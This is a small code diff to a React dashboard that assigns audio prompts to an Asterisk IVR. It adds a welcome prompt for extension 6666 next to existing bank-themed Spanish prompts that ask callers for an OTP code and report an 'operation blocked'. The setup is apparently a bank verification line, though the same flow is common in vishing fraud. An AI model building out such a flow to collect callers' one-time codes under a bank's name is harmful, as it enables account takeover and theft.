@@ -234,6 +234,7 @@ export default function App() {
     agent_transfer: 'custom/conectar_asesor_banco',
     press1_invalid: 'custom/opcion_invalida',
     welcome_7777: 'custom/solicitar_codigo_otp',
+    welcome_6666: 'custom/bienvenida_6666',
     otp_welcome: 'custom/solicitar_codigo_otp',
     otp_wait: 'custom/un_momento_validando_informacion',
     otp_success: 'custom/operacion_bloqueada_exito',
@@ -674,6 +675,22 @@ export default function App() {
     }).catch(() => {});
   };
 
+  const handleAssignTo6666 = (audioId: string) => {
+    const audio = audios.find((a) => a.id === audioId);
+    if (!audio) return;
+    showToast(`Audio "${audio.name}" asignado a Bienvenida de Extensión 6666.`);
+    addLog(
+      'AMI',
+      `Bienvenida Extensión 6666 actualizada: ${audio.fileName}`,
+      `AstDB: database put ivr_vars 6666_intro "${audio.asteriskPath}"`
+    );
+    fetch('/api/asterisk/audio/assign', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ role: 'welcome_6666', asteriskPath: audio.asteriskPath }),
+    }).catch(() => {});
+  };
+
   const handleAssignToOtp = (audioId: string) => {
     setOtpConfig((prev) => ({ ...prev, welcomeAudioId: audioId }));
     const audio = audios.find((a) => a.id === audioId);
@@ -958,6 +975,7 @@ export default function App() {
             onAssignToOtp={handleAssignToOtp}
             onAssignToAgentTransfer={handleAssignToAgentTransfer}
             onAssignTo7777={handleAssignTo7777}
+            onAssignTo6666={handleAssignTo6666}
             activeAssignments={activeAudioAssignments}
             onAssignRole={handleAssignRole}
           />
